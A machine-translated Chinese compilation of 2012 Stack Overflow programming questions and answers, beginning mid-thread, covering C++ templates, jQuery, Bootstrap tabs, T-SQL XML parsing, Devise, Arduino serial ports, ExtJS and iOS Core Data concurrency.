继承表达了一种`is-a`关系。老师显然既不是a也不是`Subject`a `Lab`，这将是一个严重的提眉。所以我会说聚合 (a `has-a`or `has-many`) 是要走的路。

您还需要决定是使用值语义还是引用语义。这意味着相等性将是程序中对象的实际相等性，或者相等性可以通过对象的某些部分进行计算。

如果您使用引用语义，您将需要确保您使用的是智能指针或其他形式的内存管理，否则事情会很快变得丑陋。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-14T15:45:57.907

当您*继承*一个类时，就像在上一个示例中一样，将其视为*扩展*该类现有的已定义行为。那么，在这种情况下，问自己一个问题：“老师”是否提高了“实验室”的能力？对我来说，答案很明确——它们不是——它们是完全不同的对象，因此继承并不是在问题域中对这些元素进行建模的理想方式。一个老师*有*一个班级，一个班级*有*一个科目，等等——因此，聚合似乎是一条更好的路径。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-14T15:59:28.433

如果您查看此示例，您将理解这个概念：

```
void doExperimentsIn( Lab &room ){...} 
```

如果您从 派生`Teacher`，`Lab`您也可以在 a 中进行实验`Teacher`。（这很愚蠢。）

# c++ - 在函数调用中使用模板模板参数

> ID：11955859
> 
> 赞同：0
> 
> 时间：2012-08-14T15:35:03.260
> 
> 标签：c++, templates, factory-pattern, command-pattern

实际上，所有答案都很好，而且内容丰富，但它们并没有解决我的特定问题。我不认为这是回答的非常乐于助人的人的错，而是我的问题措辞很糟糕。因此，我决定在这里发布一个带有更多相关代码示例的全新问题：[Mixing Command pattern, Factory pattern and templates all together](https://stackoverflow.com/questions/11972818/mixing-command-pattern-factory-pattern-and-templates-all-together/11972914#11972914) ...。如果有人愿意看...

现在原来的问题：

我不认为有可能做我想做的，但我问，以防万一......

我有一系列我想通过工厂创建的模板类。我使用工厂的原因是工厂有一些数据成员用于初始化通过该工厂创建的每个类。

例如，让我们考虑这个类：

```
class DoSomething : public UndoableCommand< int, float > 
```

我试图创建一个命令工厂，所以它可以创建像上面那样的类，并处理它们的初始化、生命周期等......

在我的（非模板）CommandFactory 中，我定义了以下方法：

```
template < template <typename P1, typename P2, typename P3, typename P4> class CommandType> 
void createCommand(P1 p1, P2 p2, P3 p3, P4 p4)
{
UndoableCommand* cmdPtr;
cmdPtr=new CommandType(P1 p1, P2 p2, P3 p3, P4 p4);
//...
} 
```

但是，这不会编译。“void operator()(P1 p1, P2 p2, P3 p3, P4 p4)”行产生以下错误：

> 错误 C2065：“P1”：未声明的标识符

因为像“DoSomething”这样的类只有一个声明（DoSomething 将始终使用 < int, float >），我认为我可以使用模板参数推导，并最终得到如下语法：

```
myCommandFactory.createCommand<DoSomething>( 1 /*int*/, 1.0f /*float*/); 
```

**有可能吗？如果是这样，适当的语法是什么？**

我想我总是可以定义我的工厂方法，例如：

```
template <class CommandType, typename P1, typename P2, typename P3, typename P4> 
void createCommand(P1 p1, P2 p2, P3 p3, P4 p4)
{
UndoableCommand* cmdPtr;
cmdPtr=new CommandType(P1 p1, P2 p2, P3 p3, P4 p4);
//...
} 
```

然后打电话

```
myCommandFactory.createCommand<DoSomething, int, float>( 1 /*int*/, 1.0f /*float*/); 
```

但这是多余的，不是很优雅......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:04:53.523

首先，定义如下

```
class DoSomething : public UndoableCommand< int, float > 
```

`DoSomething`是一种类型，而不是模板，因此您不能将它与这样的功能一起使用。

让我们考虑一下，您定义`DoSomething`为

```
template <typename T, typename V>
struct DoSmth: public UndoableCommand {
    DoSmth(T, V){}
}; 
```

然后，我注意到，你的函数有 4 个参数，但你`DoSomething`只有 2 个。如果你真的想使用可变的参数计数，你应该使用可变参数模板。

因此，您的函数应如下所示：

```
struct Factory
{
    template < template <typename...> class CommandType, typename... T> 
    void createCommand(T... args)
    {
        UndoableCommand* cmdPtr = new CommandType<T...>(args...);
    }
}; 
```

您可以通过以下方式使用它：

```
int main()
{
    Factory f;
    f.createCommand<DoSmth>(1, false);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:46:26.690

尝试以下操作：

```
struct UndoableCommand { };

template <
    template <typename P1, typename P2> class CommandType,
    typename P1a, typename P2a
         >
void createCommand(P1a p1, P2a p2)
{
    UndoableCommand *cmdPtr = new CommandType<P1a,P2a>(p1, p2);
}

template <typename P1, typename P2> class MyCommand : public UndoableCommand
{
public:
    MyCommand(P1, P2) { }
};

int main()
{
   createCommand<MyCommand>(1, 2.0);
} 
```

它编译在：http: [//ideone.com/tEWR5](http://ideone.com/tEWR5)

# javascript - javascript中DOM元素的实际高度

> ID：11955860
> 
> 赞同：0
> 
> 时间：2012-08-14T15:35:04.047
> 
> 标签：javascript, jquery

我想知道 DOM 元素的真实高度。我的情况是这样的。我的例子没有CSS，只有一个默认浏览器CSS（Firefox），你可以测试一下：

```
<div class="myClass">
    <p>XXX</p>
    <p>YYY</p>
    <p>ZZZ</p>
</div>
<div class="myClass2">
  UUU
</div> 
```

结果：

```
jQuery(".myClass").height()          ------> 89px
jQuery(".myClass").innerHeight()     ------> 89px
jQuery(".myClass").innerHeight(true) ------> 89px
jQuery(".myClass").outerHeight()     ------> 89px
jQuery(".myClass").outerHeight(true) ------> 89px 
```

但是*div.myClass*的高度更高。问题在于有边距的元素。我知道我可以执行这样的事情：

```
jQuery(".myClass").outerHeight(true) 
```

但这仅在此元素具有边距时才有效，在我的情况下，边距具有子元素（`p`标签）。可以测试一下，`UUU`下移是因为margin`<p>ZZZ</p>`

有什么办法知道真实身高吗？？还是实际利润？？

您可以在[jsfiddle](http://jsfiddle.net/gmLbn/)中看到。这个例子有 css 因为 jsfiddle 有[css](http://fiddle.jshell.net/css/normalize.css)

我有恐惧，如果我有这个规则每件作品：

```
div.myClass {
    border: 1px solid red;
} 
```

​</p>

谢谢，

# tabs - twitter 引导选项卡：内容窗格中的链接不起作用

> ID：11955861
> 
> 赞同：3
> 
> 时间：2012-08-14T15:35:07.960
> 
> 标签：tabs, twitter-bootstrap

我在这里有一个工作标签实例并准备了一个 jsfiddle（不知何故，这些标签在这里无法正常工作，但链接问题仍然存在）：http: [//jsfiddle.net/Gyrga/6/](http://jsfiddle.net/Gyrga/6/)

选项卡窗格中的链接不再起作用，并且根本无法访问 URL [http://somewhere.com](http://somewhere.com)。为什么？我忽略了什么？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-14T16:01:39.460

使用选项卡时，您需要执行以下操作（**根据[文档](http://twitter.github.com/bootstrap/javascript.html#tabs)**）

```
<a href="#home" data-toggle="tab">Home</a>
<!-- etc --> 
```

```
<div class="tab-content">
    <div class="tab-pane active" id="home">...</div>
    <!-- etc -->
</div> 
```

但是在你的例子中，你把它`data-toggle="tab"`放在`.tab-pane`里面的链接上。

只需删除此属性并将其放在实际切换选项卡的链接上。这样，您甚至不需要 JavaScript 来激活它们。

[工作演示（jsfiddle）](http://jsfiddle.net/Sherbrow/Gyrga/8/)

# c# - 从 C# 访问 FoxPro 2.6

> ID：11955862
> 
> 赞同：1
> 
> 时间：2012-08-14T15:35:18.857
> 
> 标签：c#, wcf, foxpro

我需要使用现代应用程序访问存储在 FoxPro 2.6 应用程序中的数据。

我曾假设我将使用 ODBC 数据连接访问 FoxPro 中的上述数据，并且我选择的武器将是 WCF 服务。

呼叫来自 3rd 方应用程序；击中服务。服务轮询 FoxPro 数据库并返回结果。首先这听起来好听吗？

其次，它比这更复杂。FoxPro 应用程序中似乎有处理数据并返回处理结果的过程。

有没有办法做到这一点？

非常感谢任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T00:21:09.260

您尚未指定这是 FoxPro 2.6 (DOS) 还是 FoxPro 2.6a (Windows)，但无论哪种方式，我都不喜欢您的机会。

我建议您将数据取出并将其放入易于访问的数据库中。FoxPro 应该允许您将数据导出为其他几种格式，尤其是当您使用较新版本的 Visual FoxPro 打开旧 FoxPro 数据库时。过程只是可以更改的代码。

这是一次性的痛苦，可以为您节省**很多时间**。

此外，FoxPro 数据库很容易损坏，所以我建议您确保它已备份！

# c# - 从图表控件中检索 DateTime x 轴值

> ID：11955866
> 
> 赞同：5
> 
> 时间：2012-08-14T15:35:40.363
> 
> 标签：c#, asp.net

我有一个图表控件，里面有数据。x 轴数据为 DateTime，Y 轴为整数。我正在尝试从图表中提取数据并将其导出到 excel，但 DateTime 值并没有以我可以理解或弄清楚如何解码它们的方式出现。

示例值如下：

该图从 2012 年 4 月 30 日开始，一直到 2012 年 8 月 13 日。

数值显示：

```
{X=41030, Y=16991}
{X=41031, Y=34363}
{X=41032, Y=26744}
{X=41033, Y=28180}
{X=41034, Y=17478}

...intermediate values

{X=41134, Y=1785} 
```

我将图表 x 轴类型设置为日期时间

```
RestartBooksAttempts.Series["Attempts"].XValueType = ChartValueType.DateTime;
RestartBooksAttempts.Series["Books"].XValueType = ChartValueType.DateTime; 
```

我正在通过以下方式获取值：

```
Convert.ToDateTime(chart.Series[s.Name].Points[i].XValue)
double y = chart.Series[s.Name].Points[i].YValues[0]; 
```

显然 x 点不是 DateTime 可转换值，有人知道如何解码这些值吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-14T15:43:46.630

好的，我发现了。

您必须使用 DateTime.FromOADate(double) 将其转换回来。

# sql-server - TSQL 中的 XML 解析给出了无效的列错误？

> ID：11955867
> 
> 赞同：3
> 
> 时间：2012-08-14T15:35:42.103
> 
> 标签：sql-server, xml, tsql, xml-parsing

我正在尝试解析一个简单的 XML 文件。一旦我取消注释插入语句，它就会给我无效的列错误。

```
drop table #TEMP
drop table #TEMP_T

declare @XMl_DATA AS XML
set @XMl_DATA =
'<DocumentElement>
  <Att_Table>
    <L_ATTR_CD>GAS_FLOW_START_DATE</L_ATTR_CD>
    <L_ATTR_DESC>GAS FLOW START DATE</L_ATTR_DESC>
    <L_ATTR_VALUE>01/01/2012</L_ATTR_VALUE>
    <R_ATTR_CD>EX_CTRCT_CO_ID</R_ATTR_CD>
    <R_ATTR_DESC>EXCLUDE GID(S)</R_ATTR_DESC>
    <R_ATTR_VALUE />
  </Att_Table>
  <Att_Table>
    <L_ATTR_CD>GAS_FLOW_END_DATE</L_ATTR_CD>
    <L_ATTR_DESC>GAS FLOW END DATE</L_ATTR_DESC>
    <L_ATTR_VALUE>01/31/2012</L_ATTR_VALUE>
    <R_ATTR_CD>EX_CTRCT_NBR</R_ATTR_CD>
    <R_ATTR_DESC>EXCLUDE CONTRACT NUMBER(S)</R_ATTR_DESC>
    <R_ATTR_VALUE />
  </Att_Table>
  <Att_Table>
    <L_ATTR_CD>CTRCT_CO_ID</L_ATTR_CD>
    <L_ATTR_DESC>GID(S)</L_ATTR_DESC>
    <L_ATTR_VALUE />
    <R_ATTR_CD>EX_RATE_CMPNT_CD</R_ATTR_CD>
    <R_ATTR_DESC>EXCLUDE RATE COMPONENT CODE(S)</R_ATTR_DESC>
    <R_ATTR_VALUE />
  </Att_Table>
  <Att_Table>
    <L_ATTR_CD>CTRCT_NBR</L_ATTR_CD>
    <L_ATTR_DESC>DART STYLE CONTRACT NUMBER(S)</L_ATTR_DESC>
    <L_ATTR_VALUE />
    <R_ATTR_CD>EX_PT_ID_NBR</R_ATTR_CD>
    <R_ATTR_DESC>EXCLIDE POINT ID NUMBER(S)</R_ATTR_DESC>
    <R_ATTR_VALUE />
  </Att_Table>
  </DocumentElement>' 
```

温度表：

```
CREATE TABLE #TEMP_T 
    (
        ID INT IDENTITY(1,1), 
        ATT_CD VARCHAR(50), 
        ATT_CD_VALUE VARCHAR(1000)
    )

SELECT 
    cast(Colx.query('data(L_ATTR_CD)') as varchar(max))as L_ATTR_CD,
    cast(Colx.query('data(L_ATTR_VALUE)') as varchar(max))as L_ATTR_CD_VALUE,
    cast(Colx.query('data(R_ATTR_CD)') as varchar(max)) as R_ATTR_CD,
    cast(Colx.query('data(R_ATTR_VALUE)') as varchar(max))as R_ATTR_CD_VALUE
    INTO #TEMP 
    FROM @XMl_DATA.nodes('DocumentElement/Att_Table') AS T(Colx)

    --INSERT INTO #TEMP_T(ATT_CD,ATT_CD_VALUE)
    --SELECT LTRIM(RTRIM(L_ATT_CD)),LTRIM(RTRIM(L_ATT_CD_VALUE)) 
    --FROM #TEMP 
    --WHERE L_ATT_CD_VALUE <> 'NO_DATA'

    --INSERT INTO #TEMP_T(ATT_CD,ATT_CD_VALUE)
    --SELECT LTRIM(RTRIM(R_ATT_CD)),LTRIM(RTRIM(R_ATT_CD_VALUE)) 
    --FROM #TEMP 
    --WHERE R_ATT_CD_VALUE <>'NO_DATA' 
```

输出：

```
 select * from #TEMP_T
        select * from #TEMP 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:40:05.807

有时你使用像`L_ATTR`and之类的东西`R_ATTR`，而其他时候你使用像`L_ATT`and之类的东西`R_ATT`（没有`R`s）。选择一个并坚持下去。

提及“无效列”的错误消息试图告诉您：您尝试从中选择的列`#TEMP`是“无效的”，因为您使用的名称与创建时的名称不同`#TEMP`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:43:35.873

你为什么不做这样的事情？

```
-- define your XML structure and create the #TEMP_T table

;WITH ParsedData AS 
(
    SELECT
        Colx.value('(L_ATTR_CD)[1]', 'varchar(50)') as L_ATTR_CD,
        Colx.value('(L_ATTR_VALUE)[1]', 'varchar(50)') as L_ATTR_CD_VALUE,
        Colx.value('(R_ATTR_CD)[1]', 'varchar(50)') as R_ATTR_CD,
        Colx.value('(R_ATTR_VALUE)[1]', 'varchar(50)') as R_ATTR_CD_VALUE
    FROM 
        @XMl_DATA.nodes('DocumentElement/Att_Table') AS T(Colx)
)
INSERT INTO #temp_T(ATT_CD, ATT_CD_VALUE)
    SELECT L_ATTR_CD, L_ATTR_CD_VALUE
    FROM parseddata
    UNION
    SELECT R_ATTR_CD, R_ATTR_CD_VALUE
    FROM parseddata 
```

这只是解析 XML（也比您的方法简单得多！），然后一次性将 ( `L_ATTR_CD, L_ATTR_CD_VALUE`) 和 ( `R_ATTR_CD, R_ATTR_CD_VALUE`) 对插入到临时表中。

# jquery - jsRender渲染模板后如何操作DOM？

> ID：11955872
> 
> 赞同：1
> 
> 时间：2012-08-14T15:36:00.150
> 
> 标签：jquery, jquery-ui, jsrender

我知道我们可以使用`$(document).on(event, selector, function)`. 但是我怎样才能在这些元素上做一些 jQuery。

说，我需要添加`datepicker`一些`input[type=date]`. 我该怎么做？

- - 更新 - - -

我的外部模板应该被放入

```
<div id="form-output">
</div> 
```

但即使表单显示在浏览器中，模板中的 DOM 也不在上面的 div 中。如何使用 jQuery 访问这些 DOM？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:43:25.223

jsRender 做所有事情都是异步的。它也没有任何类型的回调函数，所以创建你自己的：

```
$.when( { dojsRenderStuff } ).done(
       function(){ $("input[type=date]").datepicker();
    } 
); 
```

[http://api.jquery.com/jQuery.when/](http://api.jquery.com/jQuery.when/)

# symfony - 在 Symfony2 中，如何处理动态访问/权限？

> ID：11955873
> 
> 赞同：0
> 
> 时间：2012-08-14T15:36:01.497
> 
> 标签：symfony, privacy

我试图找到使用 Symfony2 处理“复杂”安全/隐私系统的最佳方法。

我阅读了很多关于 the`ROLES`和 the的文档，`ACLs`但我正在寻找不同的东西。我需要根据对象的属性计算权限。

在我的例子中，我有一个`User`对象和多个其他对象（`Project`、`Task`、`Label`等等......）。

我需要检查是否`User`可以在不将权限存储在数据库中的情况下**读取**或**写入**`ACL`任何类型的对象（就像系统正在做的那样）。权利应该基于`User`和给定对象之间的关系“计算”。

例如，`User(1)`可以**写**在 上，`Task(2)`因为他是 的成员，`Project(3)`而`Task(2)`是`Project(3)`。

安全服务的角色无法处理这个问题。ACL 可以处理它，但我不想将权限存储在我的数据库中，因为我知道它们会在产品生命周期内发生很大变化。

是否有针对这种需求的已知良好做法，或者我应该编写自己的系统？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:06:16.027

“他们将在产品的生命周期内发生很大变化”-> IMO，存储在数据库中是最好的，ACL 是一个很好的方法。

在上面的示例中，ACL 可以很好地管理用户和项目之间的权限，并且任务的权限取决于此项目权限。

如果您实现自己的 aclVoter，则可以在您的控制器中访问这些权限，并且您可以分别使用 isGranted() 和 is_granted() 查看：http: [//symfony.com/doc/current/cookbook/security/voters.html](http://symfony.com/doc/current/cookbook/security/voters.html)

# ruby-on-rails - Ruby on Rails - 设计可确认

> ID：11955881
> 
> 赞同：0
> 
> 时间：2012-08-14T15:36:24.097
> 
> 标签：ruby-on-rails, devise, has-and-belongs-to-many, devise-confirmable

我是 RoR 菜鸟，正在使用 rails 3.2.3。

我一直在使用设计，到目前为止它一直很棒，但是，我遇到了一个问题。

我有一个`User`带有设计的表和一个与角色表的 HABTM 关联。我创建了连接表，一切都很好。当我创建一个用户并选择它的角色时，它会正确地在连接表中创建数据。

但是，我激活了设计的`confirmable`选项，事情开始出错。当我创建一个新用户时，**它不再按应有的方式在连接表中插入记录。**

我的意思是，我所做的所有文字工作都是`, :confirmable`在其他设计选项之前添加，例如`:database_authenticatable, :recoverable, :rememberable, :trackable`and `:validatable`。

当我激活时，`:confirmable`我写了这个迁移（我也看到堆栈溢出）：

```
class AddConfirmableToDeviseV < ActiveRecord::Migration
def change
    change_table(:users) do |t| 
      t.confirmable 
    end
    add_index  :users, :confirmation_token, :unique => true 
  end
end 
```

它会发送带有确认链接的电子邮件，这没有错，但是当我单击它时，应用程序会中断，因为该用户没有分配给它的角色，这是必须的。

正如我所说，我所做的只是添加`:confirmable`. 如果我在我的用户模型中**这样注释掉它，`#,:confirmable`****角色和用户数据就会正确地插入到连接表中。**

这是怎么回事？有小费吗？

提前致谢，

问候

# 更新

@凯尔C

我正在使用常规操作创建用户：

看法：

```
<div class="field">
    <%= f.label :username %><br />
    <%= f.text_field :username %>
</div>
(...)

<% for role in Role.find(:all) %>
  <div class="field">
  <%= check_box_tag "user[role_ids][]", role.id, @user.roles.include?(role) %>
  <%= role.name %>
  </div>
<%end%> 
```

然后在我的控制器中：

```
def create

@user = User.new(params[:user])    

respond_to do |format|
  if @user.save
    format.html { redirect_to(@user, :notice => 'User was successfully created.') }
  (...) 
```

**没有`:confirmable`**，这足以在连接表中输入数据。

最重要的是，我的应用程序控制器中有这个：

```
def after_sign_in_path_for(resource)

if current_user.roles.first.id == 1
  admin_dashboard_path
elsif current_user.roles.first.id == 2
  manage_path
end

end 
```

如果我把它拿出来，用户在点击确认电子邮件时会登录，**但是**，中间连接表仍然没有得到关联。

我浏览了文档（[https://github.com/plataformatec/devise/blob/master/lib/devise/models/confirmable.rb](https://github.com/plataformatec/devise/blob/master/lib/devise/models/confirmable.rb)），但我还是个菜鸟，我也没有找到任何可以覆盖我的应用程序的初始行为。

创建用户后，有没有办法强制输入联接表中的记录？

我试过这个：

```
def create

@user = User.new(params[:user])
@role = Role.find(params[:user][:role_ids])

if @user.save
@user.role << @role
@user.save 
```

AND（做错事但仍然没有成功）

```
(...)
if @user.save
query = ActiveRecord::Base.connection.raw_connection.prepare("INSERT INTO roles_users (role_id, user_id) VALUES (?,?);")
query.execute(@role.id, @user.id)
query.close 
```

这真是令人沮丧，其他人在`:confirmable`使用 HABTM 激活时遇到了这个问题？

感谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:44:11.253

t.confirmable 不再受支持，请使用此迁移

```
 ## Confirmable
  # t.string   :confirmation_token
  # t.datetime :confirmed_at
  # t.datetime :confirmation_sent_at
  # t.string   :unconfirmed_email 
```

# java - 通过串口监视器和Java同时读取Arduino

> ID：11955886
> 
> 赞同：1
> 
> 时间：2012-08-14T15:36:34.753
> 
> 标签：java, serial-port, port, arduino, serial-communication

我用 java 编写了一个代码来与我的 Arduino 板通信。它运作良好。我也可以使用串行监视器与 Arduino 板通信。

但是当我尝试打开串行监视器时，当 java 程序正在运行时（监听连接到你的板的端口，*PORT 32*），它没有说，

`Serial port 'COM 32' already in use. Try quitting any programs that may be using it.`

这是完整的消息（只是为了完整起见）

```
Binary sketch size: 3,994 bytes (of a 258,048 byte maximum)
processing.app.SerialException: Serial port 'COM32' already in use. Try quiting any programs that may be using it.
    at processing.app.Serial.<init>(Serial.java:171)
    at processing.app.Serial.<init>(Serial.java:92)
    at processing.app.SerialMonitor.openSerialPort(SerialMonitor.java:207)
    at processing.app.Editor.handleSerial(Editor.java:2447)
    at processing.app.EditorToolbar.mousePressed(EditorToolbar.java:353)
    at java.awt.Component.processMouseEvent(Component.java:6260)
    at javax.swing.JComponent.processMouseEvent(JComponent.java:3267)
    at java.awt.Component.processEvent(Component.java:6028)
    at java.awt.Container.processEvent(Container.java:2041)
    at java.awt.Component.dispatchEventImpl(Component.java:4630)
    at java.awt.Container.dispatchEventImpl(Container.java:2099)
    at java.awt.Component.dispatchEvent(Component.java:4460)
    at java.awt.LightweightDispatcher.retargetMouseEvent(Container.java:4574)
    at java.awt.LightweightDispatcher.processMouseEvent(Container.java:4235)
    at java.awt.LightweightDispatcher.dispatchEvent(Container.java:4168)
    at java.awt.Container.dispatchEventImpl(Container.java:2085)
    at java.awt.Window.dispatchEventImpl(Window.java:2475)
    at java.awt.Component.dispatchEvent(Component.java:4460)
    at java.awt.EventQueue.dispatchEvent(EventQueue.java:599)
    at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:269)
    at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:184)
    at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:174)
    at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:169)
    at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:161)
    at java.awt.EventDispatchThread.run(EventDispatchThread.java:122) 
```

是的，我知道，它是我的 java 程序，它正在使用该端口。但这是否意味着我不能同时使用这两个程序来访问 PORT32？

希望有人能告诉我解决这个问题的方法。任何帮助是极大的赞赏。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:39:54.237

您的观察是正确的，串行端口一次只能由一个应用程序打开。有可用于拆分串行端口或监控它们的软件解决方案，但我没有足够的经验来提供任何建议。

# extjs - Extjs 4 Ext.data.Model：如何建模嵌套对象

> ID：11955889
> 
> 赞同：2
> 
> 时间：2012-08-14T15:36:51.133
> 
> 标签：extjs

我是 Extjs 4 的新手，我正在尝试了解如何为具有嵌套对象的数据创建模型。

示例数据：

```
{
  data1:{
      field1:1,
      field2:2,

      **objField1**:{
          objField1:1,
          objField2:2,

          **anotherObj**:{
             field1:1,
             field2:2,
             arrayofObjs:[
               {
                 //... 
               },
               //...
             ]
          }
      },

      objField2:{
          //... Some more fields or objects
      },

  data2:{
     //...
  }
} 
```

我试图了解如何对这些数据进行建模。这些领域很容易

```
Ext.define('MyModel', {
extend: 'Ext.data.Model',
fields: [
    {name: 'field1',  type: 'int'},
    {name: 'field2',   type: 'int'}
], //... 
```

但是如何为对象建模？我在想我可以为子对象和设置关联创建一个模型，但是在阅读了文档之后，它们似乎需要有 ID。因此，如果您查看 belongsTo 页面，“所有者模型应该有一个引用关联模型的主键的外键”。

我不希望对具有外键关系的数据进行建模，而只是对具有子对象的对象进行建模。因此，服务器可能会返回一个带有多个子对象的 JSON 对象，其中一个我可能想要绑定到网格，另一个对象的数据到选择框等。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T16:35:54.070

我认为你在这里有几个问题。

首先，Ext JS 中的模型主要用于表示关系数据，即 SQL 数据库中的行。你可以扭曲它们来做任何你想做的事情，但这并不意味着它会很容易，而且总是存在“做什么”的问题。

其次，Ext.data.Model 根本不适合表示树状结构；您可以为此使用 Ext.data.NodeInterface。NodeInterface 是Model 的*一种*类覆盖，部分是混合，通常是非常笨拙和僵化的东西。好的一面是它可以工作，而坏的一面是没有其他类可以做同样的事情。

其次，*嵌套数据对象*并不一定意味着它们实际上是相互关联的。你说你想从一个全局 JSON 响应中提取对象；这可以通过使用不同的 Reader 配置多个 Store[并](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.reader.Json-cfg-root)为它们提供相同的 JSON 对象来轻松完成。

OTOH，数据结构看起来有点复杂。这是在服务器端进行初步优化的尝试吗？即，将我们可能需要的所有内容放入一个巨大的 JSON 中以节省服务器点击量？如果是这样，请查看[Ext.Direct](http://www.sencha.com/products/extjs/extdirect/)远程处理；它可以使您免于以后的许多头痛。

# ios - iOS：使用 Grand Central Dispatch (GCD) 时如何同步我的 managedObjectContext？

> ID：11955905
> 
> 赞同：0
> 
> 时间：2012-08-14T15:37:47.703
> 
> 标签：ios, xml, ios5, xml-parsing, grand-central-dispatch

我正在使用以下代码运行解析我的 xml 文件的函数...

```
dispatch_queue_t queue = dispatch_queue_create("updateQueue", DISPATCH_QUEUE_CONCURRENT);

dispatch_async(queue,^ { [self updateFromXMLFile:@"http://path/to/file.xml"]; } ); 
dispatch_async(queue,^ { [self updateFromXMLFile:@"http://path/to/file1.xml"]; } );
dispatch_async(queue,^ { [self updateFromXMLFile:@"http://path/to/file2.xml"]; } );
dispatch_async(queue,^ { [self updateFromXMLFile:@"http://path/to/file3.xml"]; } );

dispatch_barrier_async(queue,^ {
    dispatch_async(dispatch_get_main_queue(),^ { 
            [self setBottomBarToUpdated]; 
    });
}); 
```

下面是功能`updateFromXMLFile`：

```
- (BOOL) updateFromXMLFile:(NSString *)pathToFile {

         NSURL *url = [[NSURL alloc] initWithString:pathToFile];
         NSXMLParser *xmlParser = [[NSXMLParser alloc] initWithContentsOfURL:url];

         XMLParser *parser = [[XMLParser alloc] initXMLParser];

         parser.managedObjectContext = self.managedObjectContext;

         [xmlParser setDelegate: parser];

         BOOL success = [xmlParser parse];

         if(success)
              return TRUE;
         else
              return FALSE;

} 
```

我遇到的问题是此错误消息：`***Terminating app due to uncaught exception 'NSGenericException', reason: '*** Collection <__NSCFSet: 0xc675e10> was mutated while being enumerated.'`

我猜它与同时与我的 ManagedObjectContext 混淆的所有进程有关。我不确定如何处理。有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:06:55.503

问题是您不能使用并发队列来连接 MOC，您必须使用串行队列。将您的队列创建更改为

```
dispatch_queue_t queue = dispatch_queue_create("updateQueue", DISPATCH_QUEUE_SERIAL); 
```

一切都会好起来的。同样，这样做的原因是最终的 XMLParser 对象同时尝试与 moc 交互。

您的选项取决于 XMLParser（或任何类）正在做什么。如果一个类在与 MOC 交互之前完成了繁重的工作，或者它从 Web 下载数据，那么您将通过并发获得一些东西。

我建议你做的是从 URLS 下载你需要的数据，然后使用 MOC 串行工作。您必须在单个线程（在 iOS 中）上与 MOC 交互，但这不一定是 mainThread - 它可以是任何线程，只要它只是一个线程即可。这意味着如果您创建自己的串行队列，则必须在该队列上完成所有工作，包括创建 MOC！

回到你的代码。让我们假设您在 mainQueue 上完成所有核心数据工作（目前）。解决方案是将您的代码更改为：

```
dispatch_async(dispatch_get_global_queue(0,0) {
  NSURL *url = [[NSURL alloc] initWithString:pathToFile];
  NSData *data = [NSData dataWithContentsOfURL:url];
  NSXMLParser *xmlParser = [[NSXMLParser alloc] initWithData:data];
  XMLParser *parser = [[XMLParser alloc] initXMLParser];
  parser.managedObjectContext = self.managedObjectContext;
  [xmlParser setDelegate: parser];

  dispatch_async(dispatch_get_main_queue(), {
         BOOL success = [xmlParser parse];

         // need some means to associate success/failure with the URL
  } ); 
```

你可以同时做尽可能多的事情，在点击 MOC 时进行序列化。当您为 MOC 使用串行队列时，唯一的区别是您将向该队列而不是 mainQueue 发送消息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T16:14:42.990

您需要展示您的 XMLParser 如何处理其委托职责的代码，因为这就是被调用的内容。

现在，您从不同的线程中同时解析多个文件。它们都调用不同的 XMLParser 对象，但每个都使用相同的托管对象上下文 (MOC)。

如果您使用默认的 MOC 设置，则需要将所有这些 MOC 调用重新召集到主线程（如果是，确实是您第一次创建上下文的位置）。如果您使用限制，并且您的 MOC 不是在主线程上创建的，那么您会给自己带来更多麻烦。

但是，这是一个非常简单的修复。在该解析器委托方法中，每当您使用托管对象上下文时，将其包含在调用中以在主线程上分派该部分。

```
dispatch_async(dispatch_get_main_queue(), ^{
    // Put your code that accesses the MOC in here.
}); 
```

现在，要对 Core Data 进行批量下载，最好使用两种方法中的一种。

创建一个新的 MOC，直接连接到持久存储协调器，并在那里进行所有保存。您的主要 MOC 需要观察保存通知并合并这些更改。

或者，使新的 MOC 成为您的主 MOC 的子 MOC，并直接保存到其中，然后它可以保存。

但是，如果您的托管对象上下文是 NSMainQueueConcurrencyType 或 NSPrivateQueueConcurrency 类型（上述第二个选项的唯一方法），那么您可以使用它的 perfromBlock 方法...

```
[managedObjectContext performBlock:^{
    // Do your MOC stuff in here
}]; 
```

The bottom line is that a MOC can be created with one of three concurrency types. If it is NSConfinementConcurrencyType, then you must not touch it outside the thread in which it was created. If it is NSMainQueueConcurrencyType, you have to use performBlock* or only touch it in the main thread. If it is NSPrivateConcurrencyType, you must use performBlock*.

# .net - 继续任务 在不阻塞结果 的情况下执行任务

> ID：11955906
> 
> 赞同：11
> 
> 时间：2012-08-14T15:37:53.007
> 
> 标签：.net, asynchronous

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-14T15:43:06.153

[您可以使用TaskExtensions.Unwrap](http://msdn.microsoft.com/en-us/library/dd780917.aspx)将整个链编写为：

```
Task<string> DoBoth(int value)
{
    Task<Task<string>> task = DoInt(value).ContinueWith(valueTask => 
    {
        return DoString(valueTask.Result); 
    });

    return task.Unwrap();
} 
```

